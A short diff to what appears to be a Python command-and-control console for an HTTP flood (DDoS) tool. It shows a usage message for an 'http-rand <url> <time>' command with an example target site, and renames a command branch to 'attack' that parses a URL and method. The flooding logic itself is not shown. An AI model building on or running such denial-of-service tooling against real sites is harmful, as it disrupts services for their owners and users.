@@ -136,7 +136,7 @@ def main():
                 print(Fore.RED +'Usage: http-rand <url> <time>')
                 print(Fore.RED +'Example: http-rand http://LeMinhTu.info/ 60')
 
-        elif "sever" in cnc:
+        elif "attack" in cnc:
             try:
                 url = cnc.split()[1]
                 method = cnc.split()[2]
